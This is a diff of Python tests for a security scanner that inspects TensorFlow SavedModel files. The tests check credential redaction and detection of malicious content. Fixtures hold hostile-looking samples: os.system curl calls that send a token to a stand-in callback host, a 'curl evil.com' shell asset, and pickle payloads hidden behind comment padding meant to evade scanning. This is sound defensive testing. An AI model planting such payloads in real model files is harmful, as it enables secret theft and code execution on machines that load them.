+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        f"file:///tmp/{github_token}/model "
+        "ssh://SSHTOKEN@git.example/repo "
+        "ftps://user:FTPSPASSWORD@files.example/model.bin "
+        "https://example.com/hook?token=SEMICOLONSECRET123;STILLSECRET456&ok=1",
+        500,
+    )
+
+    assert github_token not in preview
+    assert "SSHTOKEN" not in preview
+    assert "user:FTPSPASSWORD" not in preview
+    assert "SEMICOLONSECRET123" not in preview
+    assert "STILLSECRET456" not in preview
+    assert "file:///tmp/<redacted>/model" in preview
+    assert "ssh://<credentials-redacted>@git.example/repo" in preview
+    assert "ftps://<credentials-redacted>@files.example/model.bin" in preview
+    assert "token=<redacted>" in preview
+    assert "ok=1" in preview
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_collection_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-collection-secret-value-00000000"
+    collection_payload = (
+        f'os.system("curl https://callback.example/hook?token={raw_secret}")\napi_key="{raw_secret}"\n'
+    ).encode()
+    model_path = _create_test_savedmodel_with_collection(
+        tmp_path,
+        key="runtime_hook",
+        value=collection_payload,
+        model_name="collection_preview_secret",
+    )
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
+    collection_checks = [check for check in result.checks if check.name == "SavedModel Collection Executable Pattern"]
+
+    assert result.has_warnings is True
+    assert collection_checks
+    preview = collection_checks[0].details["value_preview"]
+    assert "os.system" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_pyfunc_code_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-pyfunc-secret-value-00000000"
+    python_code = (
+        f'import os\napi_key = "{raw_secret}"\nos.system("curl https://callback.example/hook?token={raw_secret}")\n'
+    )
+    model_path = _create_test_savedmodel_with_scoped_nodes(
+        tmp_path,
+        graph_nodes=[
+            {
+                "op": "PyFunc",
+                "name": "pyfunc_with_secret_code",
+                "string_attrs": {"func": python_code},
+            }
+        ],
+        model_name="pyfunc_preview_secret",
+    )
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
+    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Python Code Analysis"]
+
+    assert result.success is False
+    assert pyfunc_checks
+    preview = pyfunc_checks[0].details["code_preview"]
+    assert "os.system" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_pyfunc_code_preview_redacts_container_secret_values(tmp_path: Path) -> None:
+    raw_secrets = [
+        "c081-multiline-secret-000000",
+        "c081-env-secret-111111",
+        "c081-auth-secret-222222",
+        "c081-map-secret-333333",
+    ]
+    python_code = (
+        "import os\n"
+        'os.system("curl https://callback.example/public")\n'
+        f'private_key = """{raw_secrets[0]}\n{raw_secrets[0]}"""\n'
+        f'os.environ["API_KEY"] = "{raw_secrets[1]}"\n'
+        f'headers = {{"Authorization": "{raw_secrets[2]}", "client_secret": "{raw_secrets[3]}"}}\n'
+    )
+    model_path = _create_test_savedmodel_with_scoped_nodes(
+        tmp_path,
+        graph_nodes=[
+            {
+                "op": "PyFunc",
+                "name": "pyfunc_with_structured_secret_code",
+                "string_attrs": {"func": python_code},
+            }
+        ],
+        model_name="pyfunc_structured_preview_secret",
+    )
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
+    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Python Code Analysis"]
+
+    assert result.success is False
+    assert pyfunc_checks
+    preview = pyfunc_checks[0].details["code_preview"]
+    assert "os.system" in preview
+    for raw_secret in raw_secrets:
+        assert raw_secret not in preview
+        _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_pyfunc_invalid_data_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-pyfunc-invalid-secret-000000"
+    python_data = f'api_key = "{raw_secret}"\nif True print("broken")\n'
+    model_path = _create_test_savedmodel_with_scoped_nodes(
+        tmp_path,
+        graph_nodes=[
+            {
+                "op": "PyFunc",
+                "name": "pyfunc_with_secret_data",
+                "string_attrs": {"func": python_data},
+            }
+        ],
+        model_name="pyfunc_data_preview_secret",
+    )
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
+    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Code Validation"]
+
+    assert result.success is False
+    assert pyfunc_checks
+    preview = pyfunc_checks[0].details["data_preview"]
+    assert "api_key" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_keras_metadata_code_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-keras-metadata-secret-000000"
+    decoded_code = (
+        "import os\n"
+        f'client_secret = "{raw_secret}"\n'
+        f'os.system("curl https://callback.example/hook?token={raw_secret}")\n'
+    )
+    encoded_code = base64.b64encode(decoded_code.encode()).decode()
+    metadata_path = tmp_path / "keras_metadata.pb"
+    metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
+    lambda_checks = [check for check in result.checks if check.name == "Lambda Layer Security Check"]
+
+    assert result.success is False
+    assert lambda_checks
+    preview = lambda_checks[0].details["code_preview"]
+    assert "os.system" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_scan_keras_metadata_pb_lambda_exec_sets_success_false(tmp_path: Path) -> None:
     """Standalone `keras_metadata.pb` scans should propagate CRITICAL Lambda findings to success=False."""
@@ -698,7 +1296,7 @@ def test_scan_keras_metadata_pb_lambda_exec_sets_success_false(tmp_path: Path) -
     metadata_path = tmp_path / "keras_metadata.pb"
     metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())
 
-    result = TensorFlowSavedModelScanner().scan(str(metadata_path))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
 
     assert result.success is False
     assert any(
@@ -714,7 +1312,7 @@ def test_savedmodel_assets_benign_text_file_passes(tmp_path: Path) -> None:
     model_dir = Path(create_tf_savedmodel(tmp_path))
     (model_dir / "assets" / "vocab.txt").write_text("token_a\ntoken_b\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_checks = [check for check in result.checks if check.name == "SavedModel Assets Security Check"]
 
     assert asset_checks == []
@@ -726,7 +1324,7 @@ def test_savedmodel_root_sibling_pickle_is_flagged(tmp_path: Path) -> None:
     sibling_path = model_dir / "payload.dat"
     sibling_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -744,7 +1342,7 @@ def test_savedmodel_reserved_root_dir_name_file_is_flagged(tmp_path: Path) -> No
     sibling_path = model_dir / "assets.extra"
     sibling_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -761,7 +1359,7 @@ def test_savedmodel_root_sibling_benign_text_stays_clean(tmp_path: Path) -> None
     sibling_path = model_dir / "README.txt"
     sibling_path.write_text("model notes only\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     assert not [
         check
@@ -777,7 +1375,7 @@ def test_savedmodel_root_sibling_directory_pickle_is_flagged(tmp_path: Path) -> 
     sibling_path.parent.mkdir()
     sibling_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -800,7 +1398,7 @@ def test_savedmodel_reserved_root_dir_name_symlink_is_reported(
     shutil.rmtree(sibling_path)
     sibling_path.symlink_to(target_path.name)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -825,7 +1423,7 @@ def test_savedmodel_root_sibling_directory_symlink_is_reported_without_traversal
     sibling_path = model_dir / "supplemental"
     sibling_path.symlink_to(external_dir, target_is_directory=True)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -842,9 +1440,9 @@ def test_savedmodel_root_sibling_directory_symlink_is_reported_without_traversal
 def test_savedmodel_large_unclassified_asset_marks_scan_inconclusive(tmp_path: Path) -> None:
     model_dir = Path(create_tf_savedmodel(tmp_path))
     asset_path = model_dir / "assets" / "large.dat"
-    asset_path.write_bytes(b"A" * (_ASSET_PROBE_BYTES + 1))
+    asset_path.write_bytes(b"A" * (tf_savedmodel_module._ASSET_PROBE_BYTES + 1))
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     assert result.success is False
     assert result.metadata["scan_outcome"] == "inconclusive"
@@ -859,7 +1457,7 @@ def test_savedmodel_assets_shell_script_is_flagged(tmp_path: Path) -> None:
     asset_path = model_dir / "assets" / "evil.sh"
     asset_path.write_text("#!/bin/bash\ncurl evil.com\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [
         issue
         for issue in result.issues
@@ -881,7 +1479,7 @@ def test_savedmodel_assets_python_pattern_in_non_py_file_is_flagged(tmp_path: Pa
     asset_path = model_dir / "assets" / "helper.dat"
     asset_path.write_text("import os\n\ndef runner():\n    return os.getenv('HOME')\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -903,7 +1501,7 @@ def test_savedmodel_assets_numeric_class_labels_do_not_trigger_python_source_det
     asset_path = model_dir / "assets" / "labels.txt"
     asset_path.write_text("class 1: dog\nclass 2: cat\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     matching_checks = [
         check
         for check in result.checks
@@ -921,7 +1519,7 @@ def test_savedmodel_assets_extra_pe_executable_is_flagged(tmp_path: Path) -> Non
     pe_path = extra_dir / "helper.dll"
     pe_path.write_bytes(_build_minimal_pe_bytes())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(pe_path)]
     assert asset_issues
     assert any("pe_executable" in issue.details.get("detected_content_type", "") for issue in asset_issues)
@@ -938,7 +1536,7 @@ def test_savedmodel_asset_symlink_is_reported_without_following_target(tmp_path:
     except (NotImplementedError, OSError, PermissionError) as exc:
         pytest.skip(f"Symlinks unavailable in test environment: {exc}")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -959,7 +1557,9 @@ def test_savedmodel_asset_symlink_is_not_followed_by_blacklist_scan(
     asset_path = model_dir / "assets" / "outside-link.txt"
     asset_path.symlink_to(external_text)
 
-    result = TensorFlowSavedModelScanner(config={"blacklist_patterns": ["suspicious_function"]}).scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner(
+        config={"blacklist_patterns": ["suspicious_function"]}
+    ).scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -979,7 +1579,7 @@ def test_savedmodel_asset_directory_symlink_is_not_traversed(tmp_path: Path) -> 
     except (NotImplementedError, OSError, PermissionError) as exc:
         pytest.skip(f"Symlinks unavailable in test environment: {exc}")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]
     traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]
@@ -1001,7 +1601,7 @@ def test_savedmodel_dangling_asset_directory_symlink_is_reported(
     extra_dir = model_dir / "assets.extra"
     extra_dir.symlink_to(tmp_path / "missing-assets", target_is_directory=True)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]
 
     assert symlink_dir_issues
@@ -1023,7 +1623,7 @@ def test_savedmodel_nested_asset_directory_symlink_is_reported_without_traversal
     except (NotImplementedError, OSError, PermissionError) as exc:
         pytest.skip(f"Symlinks unavailable in test environment: {exc}")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     nested_dir_issues = [issue for issue in result.issues if issue.location == str(nested_dir)]
     traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]
@@ -1042,7 +1642,7 @@ def test_savedmodel_assets_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
     asset_path = model_dir / "assets" / "payload.dat"
     asset_path.write_bytes(_build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1055,7 +1655,7 @@ def test_savedmodel_assets_protocol1_pickle_with_binint1_pop_prefix_is_flagged(t
     asset_path = model_dir / "assets" / "prefixed-payload.dat"
     asset_path.write_bytes(b"K\x000" + _build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1068,7 +1668,7 @@ def test_savedmodel_assets_trivial_prefix_pickle_with_trailing_junk_is_flagged(t
     asset_path = model_dir / "assets" / "trailing-junk-payload.dat"
     asset_path.write_bytes(b"(l0" + _build_protocol1_pickle_payload() + b"JUNK")
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1172,7 +1772,7 @@ def test_savedmodel_assets_extra_comment_prefixed_protocol1_pickle_is_flagged(tm
     asset_path = extra_dir / "bypass.dat"
     asset_path.write_bytes(b"#" + _build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1191,7 +1791,7 @@ def test_savedmodel_assets_extra_long_comment_prefixed_protocol1_pickle_is_flagg
     asset_path = extra_dir / "deep_bypass.dat"
     asset_path.write_bytes((b"# asset padding for documentation only\n" * 300) + _build_protocol1_pickle_payload())
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
     asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
 
     assert asset_issues
@@ -1204,7 +1804,7 @@ def test_tf_savedmodel_scanner_not_a_directory(tmp_path):
     test_file = tmp_path / "model.pb"
     test_file.write_bytes(b"dummy content")
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(test_file))
 
     # Should have an issue about invalid protobuf format or TensorFlow not installed
@@ -1229,7 +1829,7 @@ def test_tf_savedmodel_scanner_unreadable_file(tmp_path: Path, requires_symlinks
     missing.unlink()
     missing.symlink_to("/nonexistent/path")
 
-    scanner = TensorFlowSavedModelScanner(config={"blacklist_patterns": ["secret"]})
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner(config={"blacklist_patterns": ["secret"]})
     result = scanner.scan(str(model_dir))
 
     assert any("error reading file" in issue.message.lower() for issue in result.issues)
@@ -1238,6 +1838,33 @@ def test_tf_savedmodel_scanner_unreadable_file(tmp_path: Path, requires_symlinks
 def _create_test_savedmodel_with_op(tmp_path: Path, op_name: str, model_name: str | None = None) -> str:
     """Helper function to create a test SavedModel with a specific TensorFlow operation."""
     return _create_test_savedmodel_with_ops(tmp_path, [op_name], model_name)
+
+
+def _create_test_savedmodel_with_collection(
+    tmp_path: Path,
+    *,
+    key: str,
+    value: bytes,
+    model_name: str,
+) -> str:
+    """Create a SavedModel with one bytes collection entry."""
+    import importlib
+
+    importlib.import_module("modelaudit.protos")
+    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel
+
+    model_dir = tmp_path / model_name
+    model_dir.mkdir()
+
+    saved_model = SavedModel()
+    meta_graph = saved_model.meta_graphs.add()
+    meta_graph.meta_info_def.tags.append("serve")
+    meta_graph.collection_def[key].bytes_list.value.append(value)
+
+    (model_dir / "saved_model.pb").write_bytes(saved_model.SerializeToString())
+    (model_dir / "variables").mkdir()
+
+    return str(model_dir)
 
 
 def _create_test_savedmodel_with_scoped_nodes(
@@ -1327,7 +1954,7 @@ def test_tf_scanner_explanations_for_all_suspicious_ops(tmp_path: Path) -> None:
         model_path = _create_test_savedmodel_with_op(tmp_path, op_name)
 
         # Scan the model
-        scanner = TensorFlowSavedModelScanner()
+        scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
         result = scanner.scan(model_path)
 
         # Should detect the suspicious operation
@@ -1365,7 +1992,7 @@ def test_tf_scanner_explanation_categories(tmp_path: Path) -> None:
     for op_name in critical_ops:
         model_path = _create_test_savedmodel_with_op(tmp_path, op_name, f"critical_test_{op_name.lower()}")
 
-        scanner = TensorFlowSavedModelScanner()
+        scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
         result = scanner.scan(model_path)
 
         # Find issues related to this operation
@@ -1388,7 +2015,7 @@ def test_tf_scanner_no_explanation_for_safe_ops(tmp_path: Path) -> None:
     safe_ops = ["MatMul", "Add", "Relu", "Conv2D", "MaxPool"]
     model_path = _create_test_savedmodel_with_ops(tmp_path, safe_ops, "safe_model")
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     # Should not have any critical issues about suspicious operations
